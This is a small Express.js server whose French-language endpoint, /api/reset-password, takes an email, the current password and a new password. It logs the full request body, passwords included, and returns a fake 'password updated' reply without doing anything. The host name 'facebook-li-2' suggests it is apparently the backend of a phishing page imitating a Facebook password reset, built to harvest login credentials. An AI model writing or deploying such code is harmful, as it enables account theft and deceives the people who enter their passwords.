import express from 'express';
import cors from 'cors'
import bcrypt from 'bcryptjs';

const app = express();
app.use(cors());
app.use(express.json());

app.post("/api/reset-password", (req, res) => {
  const { email, currentPassword, newPassword } = req.body;

  // Vérification basique
  if (!email || !currentPassword || !newPassword) {
    return res.status(400).json({
      message: "Tous les champs sont requis."
    });
  }

  console.log("BODY COMPLET REÇU:");
  console.log(req.body);

  return res.status(200).json({
    message: "Mot de passe mis à jour avec succès ."
  });
});

app.listen(5000, () => {
  console.log("Server running on https://facebook-li-2.onrender.com");
});